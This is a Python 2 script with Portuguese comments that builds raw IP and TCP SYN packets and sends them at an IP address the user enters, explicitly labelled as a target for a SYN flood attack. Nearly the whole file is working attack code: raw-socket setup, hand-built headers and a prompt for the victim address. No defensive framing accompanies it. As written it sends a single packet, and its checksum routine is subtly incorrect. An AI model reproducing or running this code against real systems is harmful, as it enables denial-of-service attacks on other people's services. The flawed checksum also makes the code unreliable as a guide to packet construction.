import socket, sys
from struct import *
import time
import random


def countdown(t, msg,msg2):
    while t >= 1:
        print str(msg2) + str(t) + '...'
        time.sleep(1)
        t -= 1
    print( str(msg) +  '\n')

def validate_ip(s):
    a = s.split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True



def Concatena_psh_flag(source_address , dest_address , placeholder , protocol , tcp_length):

    return pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);


def Concatena_TCP_Header():
    source_port = 1234
    destine_port = 12000
    sequence_number = 0
    ack_number = 0
    doff = 5

    # FLAGS TCP
    fin_flag, syn_flag, rst_flag, psh_flag, ack_flag, urg_flag = set_TCP_Flags();

    window = socket.htons(5840)
    check = 0
    urg_ptr = 0

    offset_res = (doff << 4) + 0

    # Concatena as flags do tcp deslocadas pelas suas respectvas pos
    TCP_Flags = fin_flag + (syn_flag << 1) + (rst_flag << 2) + (psh_flag << 3) + (ack_flag << 4) + (urg_flag << 5)

    TCP_header = pack('!HHLLBBHHH', source_port, destine_port, sequence_number, ack_number, offset_res, TCP_Flags,
                      window, check, urg_ptr)

    source_address = socket.inet_aton(source_IP)
    dest_address = socket.inet_aton(destine_IP)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(TCP_header)

    psh_flag = Concatena_psh_flag(source_address, dest_address, placeholder, protocol, tcp_length)
    psh_flag = psh_flag + TCP_header;

    tcp_checksum = calcula_checksum(psh_flag)

    TCP_header = pack('!HHLLBBHHH', source_port, destine_port, sequence_number, ack_number, offset_res, TCP_Flags, window,
         tcp_checksum, urg_ptr)
    return TCP_header;

def Concatena_IP_Header():
    
    internet_header_length = 5
    ip_version = 4
    type_of_service = 0
    total_length = 20 + 20
    id = 54321
    frag_off = 0
    time_to_live = 255
    protocol = socket.IPPROTO_TCP
    check = 10

    source_address = socket.inet_aton(source_IP)
    destine_address = socket.inet_aton(destine_IP)

    internet_header_length_version = (ip_version << 4) + internet_header_length



    ip_header = pack('!BBHHHBBH4s4s', internet_header_length_version, type_of_service, total_length, id, frag_off, time_to_live, protocol, check, source_address,
                     destine_address)

    return ip_header;

def random_SourceIP():

    source_ip = '192.168.1.101'
    source_ip += ".".join(map(str, (random.randint(1, 254) for _ in range(0))))

    return  source_ip;

def set_TCP_Flags():
    return 0,1,0,0,0,0;

def calcula_checksum(msg):
    cheksum = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        cheksum = cheksum + w

        cheksum = (cheksum>>16) + (cheksum & 0xffff);
        cheksum = ~cheksum & 0xffff
     
    return cheksum;

#Criacao do RAW SOCKET TCP
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
clientSocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)


#Pacote e portas
packet = '';
source_IP = random_SourceIP()

destine_IP = ''

while 1:

	destine_IP = raw_input("Insira um IP valido para atacar com SYN FLOOD: \n >>> ")
	if validate_ip(destine_IP):
		print "IP Ok, iniciando Server em : \n"
		break
	else :
		print "IP not Ok \n"


 
# ip header
print ("Montando IP Header")
countdown(3,"IP Header montado","");
ip_header =Concatena_IP_Header()
 
# CABECALHO TCP
print ("Montando TCP Header")
countdown(3,"TCP Header montado","");
TCP_header = Concatena_TCP_Header()

#pacote a ser enviado e montado pelo cabecalho IP com o cabealho TCP
packet = ip_header + TCP_header






countdown(3,"DONE!, Ataque iniciado! + \n","Iniciando ataque em " );
print "\n"

inicio = 0
fim =0

inicio = time.time()
clientSocket.sendto(packet, (destine_IP , 0 ))
fim = fim + time.time() - inicio
print "Tempo de execucao = " + str(fim)


